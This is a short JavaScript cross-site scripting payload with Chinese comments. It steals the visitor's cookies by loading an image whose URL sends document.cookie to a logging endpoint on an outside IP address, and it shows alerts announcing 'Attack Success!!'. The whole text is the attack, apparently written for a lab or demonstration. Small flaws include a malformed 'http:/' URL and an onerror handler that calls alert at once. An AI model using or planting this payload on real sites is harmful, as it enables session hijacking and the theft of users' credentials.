//通过一下js脚本获取客户端的Cookie;
var img=document.createElement("img");
img.src = "http:/10.29.40.244/XSS/log?"+document.cookie; //进行escape-URL编码
img.onerror = alert('Attack Success!!');
document.body.appendChild(img);
alert(document.cookie);
